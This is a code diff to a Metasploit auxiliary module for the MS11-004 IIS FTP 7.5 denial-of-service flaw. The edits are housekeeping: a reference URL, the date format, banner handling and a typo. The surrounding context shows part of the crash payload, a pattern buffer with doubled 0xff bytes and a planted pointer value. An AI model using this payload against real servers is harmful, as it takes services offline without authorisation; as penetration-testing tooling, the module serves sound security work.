@@ -31,9 +31,9 @@ class MetasploitModule < Msf::Auxiliary
           [ 'BID', '45542' ],
           [ 'MSB', 'MS11-004' ],
           [ 'EDB', '15803' ],
-          [ 'URL', 'http://blogs.technet.com/b/srd/archive/2010/12/22/assessing-an-iis-ftp-7-5-unauthenticated-denial-of-service-vulnerability.aspx' ]
+          [ 'URL', 'https://msrc-blog.microsoft.com/2010/12/22/assessing-an-iis-ftp-7-5-unauthenticated-denial-of-service-vulnerability/' ]
         ],
-      'DisclosureDate' => 'Dec 21 2010'))
+      'DisclosureDate' => '2010-12-21'))
 
     register_options(
       [
@@ -46,14 +46,14 @@ class MetasploitModule < Msf::Auxiliary
     connect
 
     banner = sock.get_once(-1, 10)
-    print_status("banner: #{banner.strip}")
+    print_status("banner: #{banner.to_s.strip}")
 
     buf = Rex::Text.pattern_create(1024)
 
     # the 0xff's must be doubled, the server will un-and-re-double them.
     ffs = "\xff" * (0x7e*2)
 
-    # Continuing after the first exception sometimes leads to this being derefenced.
+    # Continuing after the first exception sometimes leads to this being dereferenced.
     buf[0,3] = [0xdeadbe00].pack('V')[1,3]
 
     buf[4,ffs.length] = ffs
